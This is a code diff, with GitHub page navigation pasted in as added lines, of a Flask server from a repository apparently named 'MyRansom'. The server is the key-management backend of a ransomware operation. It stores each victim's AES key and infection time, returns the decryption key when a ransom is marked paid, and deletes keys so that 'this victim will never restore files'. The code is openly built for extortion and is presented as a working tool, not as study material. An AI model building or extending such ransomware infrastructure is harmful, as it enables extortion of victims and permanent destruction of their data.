@@ -1,29 +1,32 @@
+Skip to content
+Search or jump to…
+
+Pull requests
+Issues
+Marketplace
+Explore
+ 
+@entropy2333 
+entropy2333
+/
+MyRansom
+1
+01
+ Code Issues 0 Pull requests 0 Actions Projects 0 Wiki Security Insights Settings
+MyRansom/flask-vue-crud-master/server/app.py /
+@501839482 501839482 0415
+702ec7d 13 hours ago
+@501839482@entropy2333
+105 lines (87 sloc)  3.05 KB
+  
 import uuid
 
 from flask import Flask, jsonify, request
 from flask_cors import CORS
+from db import victims
+import time
 
-
-VICTIMS = [
-    {
-        # 'id': uuid.uuid4().hex,
-        'id': 'On the Road',
-        'AES_key': 'Jack Kerouac',
-        'paid': True
-    },
-    {
-        # 'id': uuid.uuid4().hex,
-        'id': 'Harry Potter and the Philosopher\'s Stone',
-        'AES_key': 'J. K. Rowling',
-        'paid': False
-    },
-    {
-        # 'id': uuid.uuid4().hex,
-        'id': 'Green Eggs and Ham',
-        'AES_key': 'Dr. Seuss',
-        'paid': True
-    }
-]
+V = victims()
 
 # configuration
 DEBUG = True
@@ -35,13 +38,12 @@ app.config.from_object(__name__)
 # enable CORS
 CORS(app, resources={r'/*': {'origins': '*'}})
 
-
-def remove_victim(victim_id):
-    for victim in VICTIMS:
-        if victim['id'] == victim_id:
-            VICTIMS.remove(victim)
-            return True
-    return False
+# def remove_victim(victim_id):
+#     for victim in V.vicList:
+#         if victim['id'] == victim_id:
+#             V.vicList.remove(victim)
+#             return True
+#     return False
 
 
 # sanity check route
@@ -53,7 +55,7 @@ def ping_pong():
 @app.route('/victims', methods=['GET'])
 def all_victims():
     response_object = {'status': 'success'}
-    response_object['victims'] = VICTIMS
+    response_object['victims'] = V.vicList
     return jsonify(response_object)
 
 @app.route('/victims/add', methods=['POST'])
@@ -62,24 +64,37 @@ def add_victim():
     #     return '400 Not Json'
     post_data = request.get_json()
     response_object = {'status': 'success'}
-    VICTIMS.append({
+    V.vicList.append({
             # 'id': uuid.uuid4().hex,
-            'id': post_data.get('victim_id'),
-            'AES_key': post_data.get('AES_key'),
-            'paid': post_data.get('paid')
+            'id': post_data.get('id'),
+            'inf_time': time.ctime(),
+            'ransom': post_data.get('ransom'),
+            'AES_key': post_data.get('AES_key')
         })
+    V.new_victim(vid=post_data.get('id'), pkey=post_data.get('AES_key'))
     response_object['message'] = 'Victim added!'
     return jsonify(response_object)
 
-@app.route('/victims/<victim_id>', methods=['POST'])
-def update_victim():
+
+@app.route('/victims/<victim_id>', methods=['POST', 'DELETE'])
+def update_victim(victim_id):
     # if request.is_json:
     #     return '400 Not Json'
     post_data = request.get_json()
     response_object = {'status': 'success'}
-    if post_data.get('paid'):
-        pass
-    response_object['message'] = 'Victim updated!'
+    if request.method == 'DELETE':
+        if V.rm_victim(victim_id):
+            response_object['message'] = 'This victim will never restore files'
+        else:
+            response_object['message'] = 'No such victim'
+    else:
+
+        if post_data.get('ransom'):
+            k = V.paid(victim_id)
+            response_object['message'] = 'Promise is debt! Your files are intact.'+k
+            response_object['AES_key'] = k
+    # else:
+    #     response_object['message'] = 'Do not play tricks!'
     return jsonify(response_object)
 
 
